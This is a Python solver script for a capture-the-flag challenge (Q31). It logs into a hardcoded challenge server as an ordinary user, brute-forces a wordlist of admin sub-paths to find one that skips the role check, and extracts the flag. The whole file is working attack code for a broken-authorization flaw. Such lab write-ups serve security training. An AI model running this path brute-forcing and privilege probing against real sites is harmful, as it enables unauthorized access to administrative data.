#!/usr/bin/env python3
"""Q31 - IDOR 垂直越权 (BFLA) 自动化解题脚本
利用点: /admin 检查了 role, 但 /admin/secret 漏检 role，仅检查登录态。
"""
import re
import sys
import requests

BASE = "http://47.120.76.57:34939"
USER, PASS = "user", "user123"

# 常见 admin 子路径词表（命中率排序）
WORDLIST = [
    "admin/console", "admin/manage", "admin/users", "admin/user",
    "admin/export", "admin/secret", "admin/data", "admin/backup",
    "admin/panel", "admin/logs", "admin/dashboard", "admin/config",
    "admin/settings", "admin/api", "admin/debug", "admin/info",
    "admin/private", "admin/shell", "admin/sql", "admin/db",
]


def main():
    s = requests.Session()

    # Step 1: 登录普通用户
    s.get(f"{BASE}/login")
    r = s.post(f"{BASE}/login",
               data={"username": USER, "password": PASS},
               allow_redirects=False)
    assert r.status_code == 302, f"登录失败: {r.status_code}"
    print(f"[+] 登录成功 (PHPSESSID={s.cookies.get('PHPSESSID')})")

    # Step 2: 探测基线 (首页 fallback size & /admin 403 size)
    home_size = len(s.get(f"{BASE}/").content)
    admin_r = s.get(f"{BASE}/admin")
    print(f"[+] 基线: 首页 size={home_size} | /admin -> {admin_r.status_code} size={len(admin_r.content)}")
    print(f"[+] /admin 内容: {admin_r.text.strip()[:80]}")

    # Step 3: 爆破子路径，过滤 fallback (size==home_size) 和 /admin (403)
    print(f"[*] 爆破 {len(WORDLIST)} 个 admin 子路径...")
    hits = []
    for path in WORDLIST:
        rr = s.get(f"{BASE}/{path}", allow_redirects=False)
        if rr.status_code == 200 and len(rr.content) != home_size:
            print(f"    [HIT] /{path} -> {rr.status_code} size={len(rr.content)}")
            hits.append(path)

    # Step 4: 读取命中接口提取 flag
    for path in hits:
        body = s.get(f"{BASE}/{path}").text
        m = re.search(r"(TOGOGO-flag\{[^}]+\})", body)
        if m:
            print(f"\n[*] FLAG = {m.group(1)}")
            print(f"[*] 来源: /{path}")
            return 0
    print("[-] 未找到 flag", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
